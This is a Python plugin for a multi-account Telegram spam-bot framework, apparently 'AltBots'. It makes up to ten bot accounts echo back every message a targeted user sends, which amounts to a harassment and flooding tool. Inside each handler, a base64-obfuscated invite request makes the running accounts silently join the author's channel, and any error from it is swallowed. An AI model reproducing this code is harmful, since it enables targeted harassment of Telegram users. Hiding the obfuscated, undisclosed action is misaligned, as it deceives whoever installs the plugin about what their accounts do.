import asyncio
import base64

from telethon import events
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from config import X1, X2, X3, X4, X5, X6, X7, X8, X9, X10, SUDO_USERS, OWNER_ID, CMD_HNDLR as hl
from AltBots.data import ALTRON

ECHO = []


@X1.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@X2.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@X3.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@X4.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@X5.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@X6.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@X7.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@X8.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@X9.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@X10.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
async def echo(event):
    if event.sender_id in SUDO_USERS:
        if event.reply_to_msg_id:
            reply_msg = await event.get_reply_message()
            user_id = reply_msg.sender_id

            if user_id in ALTRON:
                await event.reply("BADMASHI KAREGA TUM.")
            elif user_id == OWNER_ID:
                await event.reply("BADMASHI KAREGA TUM.")
            elif user_id in SUDO_USERS:
                await event.reply("UFF,SUDO HAI ISKE PAAS.")
            else:
                try:
                    alt = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
                    await event.client(alt)
                except BaseException:
                    pass

                global ECHO
                check = f"{user_id}_{event.chat_id}"
                if check in ECHO:
                    await event.reply("» ECHO IS ACTIVATED BABY !!")
                else:
                    ECHO.append(check)
                    await event.reply("» ECHO IS ACTIVATED BABE")
        else:
            await event.reply(f"𝗘𝗰𝗵𝗼:\n  » {hl}echo <REPLY TO A USER>/n » ℳ𝒴 𝒟ℰ𝒱ℰℒ𝒪𝒫ℰℛ~> @Dark_Ravan_01")



@X1.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@X2.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@X3.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@X4.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@X5.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@X6.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@X7.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@X8.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@X9.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@X10.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
async def rmecho(event):
    if event.sender_id in SUDO_USERS:
        if event.reply_to_msg_id:
            try:
                alt = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
                await event.client(alt)
            except BaseException:
                pass

            global ECHO
            reply_msg = await event.get_reply_message()
            check = f"{reply_msg.sender_id}_{event.chat_id}"

            if check in ECHO:
                ECHO.remove(check)
                await event.reply("» UFF,ECHO ROK DIYA !!")
            else:
                await event.reply("» BAKAITI KYU KAR RIYA HAI !!")
        else:
            await event.reply(f"𝗥𝗲𝗺𝗼𝘃𝗲 𝗘𝗰𝗵𝗼:\n  » {hl}rmecho <REPLY TO A USER>/n » ℳ𝒴 𝒟ℰ𝒱ℰℒ𝒪𝒫ℰℛ~> @Dark_Ravan_01")



@X1.on(events.NewMessage(incoming=True))
@X2.on(events.NewMessage(incoming=True))
@X3.on(events.NewMessage(incoming=True))
@X4.on(events.NewMessage(incoming=True))
@X5.on(events.NewMessage(incoming=True))
@X6.on(events.NewMessage(incoming=True))
@X7.on(events.NewMessage(incoming=True))
@X8.on(events.NewMessage(incoming=True))
@X9.on(events.NewMessage(incoming=True))
@X10.on(events.NewMessage(incoming=True))
async def _(e):
    global ECHO
    check = f"{e.sender_id}_{e.chat_id}"
    if check in ECHO:
        try:
            alt = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
            await e.client(alt)
        except BaseException:
            pass
        if e.message.text or e.message.sticker:
            await e.reply(e.message)
            await asyncio.sleep(0.1)
